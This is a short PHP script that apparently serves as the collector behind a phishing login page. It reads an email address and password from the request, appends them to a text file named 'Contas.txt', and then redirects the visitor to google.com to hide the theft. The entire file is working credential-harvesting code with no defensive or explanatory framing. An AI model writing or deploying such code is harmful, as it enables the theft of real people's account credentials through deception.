<?php

file_put_contents("Contas.txt", "Email: " . $_GET['Email'] . " Senha: " . $_GET['Passwd'] . "\n", FILE_APPEND);
header('Location: https://google.com/');
exit();
